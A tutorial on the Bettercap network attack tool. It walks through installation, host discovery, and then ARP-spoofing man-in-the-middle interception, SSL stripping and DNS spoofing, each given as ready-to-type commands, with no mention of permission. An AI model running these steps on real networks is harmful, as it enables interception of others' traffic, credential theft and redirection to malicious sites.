# Bettercap

## Step-by-Step Tutorial on Bettercap

### Step 1: Installation
First, ensure that you have the latest version of Bettercap installed. Bettercap can be installed on various operating systems like Linux, macOS, and Windows.

**For Linux (Debian-based distributions like Ubuntu/Kali):**
```bash
sudo apt update
sudo apt install bettercap
```

**For macOS:**
```bash
brew install bettercap
```

**For Windows:**
1. Download and install the latest release from the [Bettercap GitHub Releases page](https://github.com/bettercap/bettercap/releases).
2. Extract the downloaded file and add the extracted folder to your system's PATH.

### Step 2: Running Bettercap
Open your terminal and run Bettercap with administrative privileges to start using it.

```bash
sudo bettercap
```

### Step 3: Understanding the Bettercap Interface
Once Bettercap starts, you will see a command prompt (`bettercap >`). This is where you will enter various commands to perform different tasks.

### Step 4: Basic Commands
Here are some basic commands to get started:

- **Help Command:** To see a list of available commands and modules.
  ```bash
  help
  ```

- **Modules:** To list all available modules.
  ```bash
  modules
  ```

- **Show:** To display the status of the current session and active modules.
  ```bash
  show
  ```

### Step 5: Network Scanning
One of the primary uses of Bettercap is network scanning to identify devices on the network.

- **net.probe:** To start probing for devices on the network.
  ```bash
  net.probe on
  ```

- **net.show:** To display the devices discovered on the network.
  ```bash
  net.show
  ```

### Step 6: Man-In-The-Middle (MITM) Attack
Bettercap can perform various MITM attacks. Here, we'll perform ARP spoofing to intercept network traffic.

- **arp.spoof:** To enable ARP spoofing.
  ```bash
  arp.spoof on
  ```

- **set arp.spoof.targets:** To specify the target IP address (or range) for ARP spoofing.
  ```bash
  set arp.spoof.targets 192.168.1.100
  ```

- **net.sniff:** To start sniffing network traffic.
  ```bash
  net.sniff on
  ```

### Step 7: HTTPS Downgrade
To intercept HTTPS traffic, you can use the `https.proxy` module.

- **https.proxy:** To enable HTTPS proxy.
  ```bash
  https.proxy on
  ```

- **set https.proxy.sslstrip:** To enable SSL stripping (downgrade HTTPS to HTTP).
  ```bash
  set https.proxy.sslstrip on
  ```

### Step 8: DNS Spoofing
You can also perform DNS spoofing to redirect traffic from a legitimate site to a malicious one.

- **dns.spoof:** To enable DNS spoofing.
  ```bash
  dns.spoof on
  ```

- **set dns.spoof.domains:** To specify the domain(s) to spoof.
  ```bash
  set dns.spoof.domains example.com
  ```

- **set dns.spoof.address:** To specify the IP address to which the domain should resolve.
  ```bash
  set dns.spoof.address 192.168.1.50
  ```

### Step 9: Exiting Bettercap
To stop all running modules and exit Bettercap, use the following command:
```bash
quit
```

### Step 10: Additional Resources
For more advanced usage and options, refer to the [official Bettercap documentation](https://www.bettercap.org/docs/).

